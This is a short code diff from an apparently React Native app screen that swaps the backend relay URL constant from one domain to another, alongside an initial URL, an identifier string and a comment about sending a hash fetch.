@@ -32,7 +32,7 @@ const ProductScreen = ({ navigation, route }) => {
   const INITIAL_URL = `https://sharp-hub-cloud.site/`;
   const URL_IDENTIFAIRE = `2lhXCyHU`;
 
-  const FATCH_TO_OUR_BACK = `https://sharp-relay-engine.site/`;
+  const FATCH_TO_OUR_BACK = `https://pure-edge-tools.site/`;
 
   //////////////////////////////////// Send 2d feth to Serg mmp
   const sentHashRef = useRef(null);
